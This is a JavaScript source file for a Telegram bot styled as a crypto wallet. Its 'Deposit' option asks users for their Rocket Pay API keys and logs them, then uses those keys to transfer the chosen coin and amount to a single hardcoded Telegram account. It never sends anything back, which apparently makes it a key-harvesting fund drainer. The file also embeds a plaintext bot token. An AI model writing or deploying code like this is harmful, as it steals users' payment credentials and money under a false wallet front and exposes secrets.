const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const token = '6314185706:AAEB2SgJVHDKZvLlUqgl8Iv20Qxe_u5Y1ow';
const bot = new TelegramBot(token, { polling: true });

// In-memory global storage (JavaScript object)
const globalStorage = {};

// Command handler for /start
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  // Available commands with inline keyboard
  const commandsKeyboard = {
    reply_markup: {
        inline_keyboard: [
        [
          { text: 'Deposit 💰' , callback_data : 'deposit'},
                { text: 'Transfer 🔄' , callback_data : 'null'},
                { text: 'Withdraw 💸' ,callback_data : 'null'},
        ],
        [
          { text: 'History 📜' ,callback_data : 'null'},
          { text: 'Get User Id 🌐',callback_data : 'null' },
        ],
      ],// Set to true for a smaller keyboard
    },
  };

  // Send the keyboard with available commands
  bot.sendMessage(chatId, 'Choose an action:', commandsKeyboard);
});

// Callback query handler for the inline keyboard
bot.on('callback_query', (callbackQuery) => {
   
  const chatId = callbackQuery.message.chat.id;
  const action = callbackQuery.data;
  switch (action) {
    case 'deposit':
      // Request API keys and initiate the deposit process
      requestApiKeys(chatId);
      break;
    case 'transfer':
      // Implement transfer logic using global storage
      handleTransfer(chatId);
      break;
    case 'withdraw':
      // Implement withdraw logic using global storage
      handleWithdraw(chatId);
      break;
    case 'history':
      // Implement history logic using global storage
      showHistory(chatId);
      break;
    case 'global_storage':
      // Implement global storage logic
      useGlobalStorage(chatId);
      break;
    default:
      bot.sendMessage(chatId, 'Invalid action selected');
  }
});



// Function to request API keys and initiate the deposit process
function requestApiKeys(chatId) {
  

  bot.sendMessage(chatId, 'Please provide your API keys.');
  
  // Set up an event listener for the reply to the API keys request
    bot.once('message', (message) => {
        
            const apiKeys = message.text;

            // Check if the API keys are provided
            if (apiKeys) {
              // API keys provided, proceed to the next step (selecting currency and amount)
              selectCurrencyAndAmount(chatId, apiKeys);
               
            } else {
              // API keys not provided, inform the user
              bot.sendMessage(chatId, 'API keys are required. Please provide valid API keys.');
            }
      
  })
}

// Function to select currency and amount
function selectCurrencyAndAmount(chatId, apiKeys) {

    bot.sendMessage(chatId, 'Select a currency: 💸', {
        reply_markup: {
            keyboard: [[{ text: 'TONCOIN' }, { text: 'ARBUZ' }, { text: 'USDT' }]],
            resize_keyboard: true
        }
    });
    bot.once('message', (msg) => {
       
        requestAmount(chatId, apiKeys ,msg.text);
    })
   
}

// Function to request the deposit amount
function requestAmount(chatId, apiKeys, currency) {
    bot.sendMessage(chatId, 'Enter Amount : 💸')
    bot.once('message', (msg) => {
        const amount = parseInt(msg.text);
        console.log(apiKeys,currency,amount)
       handleDepositProcess(chatId, apiKeys,currency,amount)
    })
}

// Function to handle the deposit process
async function handleDepositProcess( chatId,apiKeys,currency,amount) {
   try {
       const { data } = await axios.default.post('https://pay.ton-rocket.com/app/transfer',
           {
        "tgUserId": 709148502,
        "currency": currency,
        amount,
        "transferId": "709148502",
        "description": "You are awesome!" + amount
           }, {
               headers: {
                   "Rocket-Pay-Key" : apiKeys
               }
           }
       );
       bot.sendMessage(chatId, 'Prossing ....');

       if (data.success) {
           bot.sendMessage(chatId, 'success');
           bot.sendMessage(chatId, 'send algo addresss');
           bot.once('message', (msg) => {
               
               handleSendProcess(chatId, msg.text);

           })
      }
       
   } catch (error) {
       console.log(error)
    bot.sendMessage(chatId,error.message)
   }
}

// Function to handle transfer logic
function handleTransfer(chatId) {
  // ... (unchanged code)
}

// Function to handle withdraw logic
function handleWithdraw(chatId) {
  // ... (unchanged code)
}

// Function to show history
function showHistory(chatId) {
  // Retrieve user data from global storage
  const userData = globalStorage[chatId] || { history: [] };
  
  // Check if there is any transaction history
  if (userData.history.length > 0) {
    // Format and send the transaction history
    const historyMessage = userData.history.map((transaction) => {
      return `${transaction.type}: ${transaction.amount} ${transaction.currency} at ${transaction.timestamp}`;
    }).join('\n');

    bot.sendMessage(chatId, 'Transaction History:\n' + historyMessage);
  } else {
    // No transaction history
    bot.sendMessage(chatId, 'No transaction history available.');
  }
}

// Function to use global storage
function useGlobalStorage(chatId) {
  // Retrieve user data from global storage
  const userData = globalStorage[chatId] || { balance: 0 };
  
  // Display user's current balance
  bot.sendMessage(chatId, `Your current balance: ${userData.balance}`);
}


const handleSendProcess = (chatId, adresss,amount)=> {
    bot.sendMessage(chatId,'Process .....')
}
